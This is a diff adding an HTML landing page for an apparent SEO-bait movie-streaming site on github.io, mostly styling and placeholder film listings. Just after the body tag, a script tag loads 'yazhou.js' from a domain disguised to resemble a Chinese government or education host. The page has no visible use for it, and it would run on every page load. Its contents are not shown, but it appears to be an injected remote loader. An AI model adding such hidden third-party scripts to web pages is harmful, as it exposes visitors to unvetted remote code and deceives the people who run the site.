@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>东京热电影网 - 热门电影在线观看</title>
+    <meta name="description" content="东京热电影网(dongjingredianyingwang-app.github.io)提供最新热门电影、高清影视资源在线观看，每日更新，畅享极致观影体验。">
+    <meta name="keywords" content="东京热电影网,电影,热门电影,在线观看,高清影视,dongjingredianyingwang-app">
+    <meta name="author" content="东京热电影网">
+    <meta name="robots" content="index,follow">
+    <meta name="bingbot" content="index,follow">
+    <link rel="canonical" href="https://dongjingredianyingwang-app.github.io/">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+        
+        /* 导航栏 */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            padding: 0 5%;
+            border-bottom: 1px solid rgba(255, 60, 120, 0.2);
+        }
+        
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 0;
+        }
+        
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #ff3c78;
+            text-decoration: none;
+            letter-spacing: 1px;
+        }
+        
+        .logo span {
+            color: #00d4ff;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+        
+        .nav-links a {
+            color: #b0b0b0;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+            position: relative;
+        }
+        
+        .nav-links a:hover {
+            color: #ff3c78;
+        }
+        
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #ff3c78, #00d4ff);
+            transition: width 0.3s;
+        }
+        
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        
+        .menu-toggle {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            gap: 4px;
+        }
+        
+        .menu-toggle span {
+            width: 25px;
+            height: 3px;
+            background: #ff3c78;
+            transition: 0.3s;
+        }
+        
+        /* 英雄区域 */
+        .hero {
+            margin-top: 80px;
+            padding: 4rem 5%;
+            text-align: center;
+            background: linear-gradient(135deg, rgba(255, 60, 120, 0.1) 0%, rgba(0, 212, 255, 0.1) 100%);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .hero h1 {
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #ff3c78, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero p {
+            font-size: 1.1rem;
+            color: #888;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+        
+        .hero-btn {
+            display: inline-block;
+            padding: 0.8rem 2.5rem;
+            background: linear-gradient(135deg, #ff3c78, #ff6b9d);
+            color: #fff;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .hero-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 60, 120, 0.3);
+        }
+        
+        /* 栏目通用样式 */
+        .section {
+            padding: 4rem 5%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .section-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .section-header h2 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            color: #fff;
+        }
+        
+        .section-header p {
+            color: #666;
+            font-size: 0.95rem;
+        }
+        
+        .section-header .accent-line {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, #ff3c78, #00d4ff);
+            margin: 1rem auto;
+            border-radius: 2px;
+        }
+        
+        /* 热门推荐 */
+        .movie-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .movie-card {
+            background: #12121a;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .movie-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
+        }
+        
+        .movie-poster {
+            width: 100%;
+            height: 280px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+        }
+        
+        .movie-info {
+            padding: 1rem;
+        }
+        
+        .movie-info h3 {
+            font-size: 0.95rem;
+            margin-bottom: 0.3rem;
+            color: #e0e0e0;
+        }
+        
+        .movie-info .meta {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        /* 分类栏目 */
+        .category-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+        
+        .category-item {
+            background: #12121a;
+            padding: 2rem 1rem;
+            text-align: center;
+            border-radius: 12px;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+        }
+        
+        .category-item:hover {
+            background: linear-gradient(135deg, rgba(255, 60, 120, 0.1), rgba(0, 212, 255, 0.1));
+            border-color: rgba(255, 60, 120, 0.3);
+        }
+        
+        .category-item .icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .category-item h3 {
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        
+        /* 排行榜 */
+        .ranking-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .ranking-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: #12121a;
+            padding: 1rem;
+            border-radius: 12px;
+            transition: background 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .ranking-item:hover {
+            background: #1a1a2e;
+        }
+        
+        .rank-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #ff3c78;
+            min-width: 40px;
+            text-align: center;
+        }
+        
+        .rank-number.top3 {
+            color: #00d4ff;
+        }
+        
+        .rank-info h3 {
+            font-size: 0.95rem;
+            margin-bottom: 0.2rem;
+        }
+        
+        .rank-info .score {
+            font-size: 0.8rem;
+            color: #ffd700;
+        }
+        
+        /* 关于我们 */
+        .about-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            align-items: center;
+        }
+        
+        .about-text h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: #fff;
+        }
+        
+        .about-text p {
+            color: #888;
+            margin-bottom: 1rem;
+        }
+        
+        .about-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+        
+        .stat-item {
+            text-align: center;
+            padding: 1.5rem;
+            background: #12121a;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .stat-item .number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #ff3c78;
+        }
+        
+        .stat-item .label {
+            font-size: 0.85rem;
+            color: #666;
+            margin-top: 0.3rem;
+        }
+        
+        /* 页脚 */
+        .footer {
+            background: #060608;
+            padding: 3rem 5% 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .footer-column h4 {
+            color: #fff;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+        }
+        
+        .footer-column a {
+            display: block;
+            color: #666;
+            text-decoration: none;
+            font-size: 0.85rem;
+            margin-bottom: 0.5rem;
+            transition: color 0.3s;
+        }
+        
+        .footer-column a:hover {
+            color: #ff3c78;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            color: #555;
+            font-size: 0.8rem;
+        }
+        
+        /* 响应式 */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: rgba(10, 10, 15, 0.98);
+                flex-direction: column;
+                padding: 1rem 5%;
+                gap: 1rem;
+                border-bottom: 1px solid rgba(255, 60, 120, 0.2);
+            }
+            
+            .nav-links.active {
+                display: flex;
+            }
+            
+            .menu-toggle {
+                display: flex;
+            }
+            
+            .about-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .hero {
+                padding: 3rem 5%;
+            }
+            
+            .section {
+                padding: 3rem 5%;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .movie-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .movie-poster {
+                height: 200px;
+                font-size: 2rem;
+            }
+            
+            .category-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        /* 平滑滚动 */
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        /* 动画 */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeInUp 0.6s ease-out;
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+    <!-- 导航栏 -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo">东京热<span>电影网</span></a>
+            <ul class="nav-links">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#hot">热门推荐</a></li>
+                <li><a href="#category">电影分类</a></li>
+                <li><a href="#ranking">排行榜</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+            <div class="menu-toggle" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- 首页英雄区 -->
+    <section class="hero" id="home">
+        <h1>东京热电影网</h1>
+        <p>dongjingredianyingwang-app.github.io - 汇聚全球热门电影，高清画质，极速播放，每日更新不断</p>
+        <a href="#hot" class="hero-btn">立即探索</a>
+    </section>
+
+    <!-- 热门推荐 -->
+    <section class="section" id="hot">
+        <div class="section-header">
+            <h2>🔥 热门推荐</h2>
+            <div class="accent-line"></div>
+            <p>精选当下最热门的电影资源</p>
+        </div>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">🎬</div>
+                <div class="movie-info">
+                    <h3>奥本海默</h3>
+                    <p class="meta">2023 · 剧情/传记</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎭</div>
+                <div class="movie-info">
+                    <h3>花月杀手</h3>
+                    <p class="meta">2023 · 犯罪/剧情</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🚀</div>
+                <div class="movie-info">
+                    <h3>沙丘2</h3>
+                    <p class="meta">2024 · 科幻/冒险</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🦸</div>
+                <div class="movie-info">
+                    <h3>蜘蛛侠：纵横宇宙</h3>
+                    <p class="meta">2023 · 动画/动作</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🏴‍☠️</div>
+                <div class="movie-info">
+                    <h3>加勒比海盗5</h3>
+                    <p class="meta">2017 · 冒险/奇幻</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🌊</div>
+                <div class="movie-info">
+                    <h3>海王2</h3>
+                    <p class="meta">2023 · 动作/奇幻</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电影分类 -->
+    <section class="section" id="category" style="background: #0d0d14;">
+        <div class="section-header">
+            <h2>📂 电影分类</h2>
+            <div class="accent-line"></div>
+            <p>按类型快速找到你喜欢的电影</p>
+        </div>
+        <div class="category-grid">
+            <div class="category-item">
+                <div class="icon">😂</div>
+                <h3>喜剧片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">😱</div>
+                <h3>恐怖片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">🕵️</div>
+                <h3>悬疑片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">💥</div>
+                <h3>动作片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">💕</div>
+                <h3>爱情片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">🎨</div>
+                <h3>文艺片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">🤖</div>
+                <h3>科幻片</h3>
+            </div>
+            <div class="category-item">
+                <div class="icon">📜</div>
+                <h3>历史片</h3>
+            </div>
+        </div>
+    </section>
+
+    <!-- 排行榜 -->
+    <section class="section" id="ranking">
+        <div class="section-header">
+            <h2>🏆 热门排行榜</h2>
+            <div class="accent-line"></div>
+            <p>本周最受用户欢迎的电影榜单</p>
+        </div>
+        <div class="ranking-list">
+            <div class="ranking-item">
+                <div class="rank-number top3">1</div>
+                <div class="rank-info">
+                    <h3>奥本海默</h3>
+                    <span class="score">⭐ 9.2</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number top3">2</div>
+                <div class="rank-info">
+                    <h3>沙丘2</h3>
+                    <span class="score">⭐ 9.0</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number top3">3</div>
+                <div class="rank-info">
+                    <h3>坠落的审判</h3>
+                    <span class="score">⭐ 8.8</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number">4</div>
+                <div class="rank-info">
+                    <h3>花月杀手</h3>
+                    <span class="score">⭐ 8.7</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number">5</div>
+                <div class="rank-info">
+                    <h3>蜘蛛侠：纵横宇宙</h3>
+                    <span class="score">⭐ 8.6</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number">6</div>
+                <div class="rank-info">
+                    <h3>美国小说</h3>
+                    <span class="score">⭐ 8.5</span>
+                </div>
+            </div>
+            <div class="ranking-item">
+                <div class="rank-number">7</div>
+                <div class="rank-info">
+                    <h3>利益区域</h3>
+                    <span class="score">⭐ 8.4</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section class="section" id="about" style="background: #0d0d14;">
+        <div class="section-header">
+            <h2>📌 关于东京热电影网</h2>
+            <div class="accent-line"></div>
+        </div>
+        <div class="about-content">
+            <div class="about-text">
+                <h3>你的专属在线观影平台</h3>
+                <p>东京热电影网（dongjingredianyingwang-app.github.io）致力于为广大影迷提供最新、最全、最清晰的电影资源。我们每日更新热门影视内容，涵盖多种类型，满足不同用户的观影需求。</p>
+                <p>网站采用先进的流媒体技术，确保播放流畅不卡顿，让您随时随地享受影院级观影体验。</p>
+                <p>关键词：东京热电影网、dongjingredianyingwang-app、热门电影、在线观看、高清影视</p>
+            </div>
+            <div class="about-stats">
+                <div class="stat-item">
+                    <div class="number">10,000+</div>
+                    <div class="label">影片资源</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number">500万+</div>
+                    <div class="label">累计用户</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number">50+</div>
+                    <div class="label">电影分类</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number">24h</div>
+                    <div class="label">每日更新</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 页脚 -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-column">
+                <h4>东京热电影网</h4>
+                <a href="#hot">热门推荐</a>
+                <a href="#category">电影分类</a>
+                <a href="#ranking">排行榜</a>
+                <a href="#about">关于我们</a>
+            </div>
+            <div class="footer-column">
+                <h4>电影分类</h4>
+                <a href="#">喜剧片</a>
+                <a href="#">动作片</a>
+                <a href="#">科幻片</a>
+                <a href="#">恐怖片</a>
+            </div>
+            <div class="footer-column">
+                <h4>帮助中心</h4>
+                <a href="#">观影指南</a>
+                <a href="#">常见问题</a>
+                <a href="#">联系我们</a>
+                <a href="#">意见反馈</a>
+            </div>
+            <div class="footer-column">
+                <h4>关注我们</h4>
+                <a href="#">微信公众号</a>
+                <a href="#">微博</a>
+                <a href="#">抖音</a>
+                <a href="#">RSS订阅</a>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 东京热电影网(dongjingredianyingwang-app.github.io) 保留所有权利 | 关键词：东京热电影网</p>
+            <p style="margin-top: 0.5rem; color: #444;">本站支持必应搜索引擎收录，采用响应式设计，适配所有移动设备</p>
+        </div>
+    </footer>
+
+    <script>
+        function toggleMenu() {
+            const navLinks = document.querySelector('.nav-links');
+            navLinks.classList.toggle('active');
+        }
+        
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+                // 移动端关闭菜单
+                document.querySelector('.nav-links').classList.remove('active');
+            });
+        });
+        
+        // 滚动动画
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+        
+        const observer = new IntersectionObserver(function(entries) {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('fade-in');
+                }
+            });
+        }, observerOptions);
+        
+        document.querySelectorAll('.section').forEach(section => {
+            observer.observe(section);
+        });
+    </script>
+</body>
+</html>
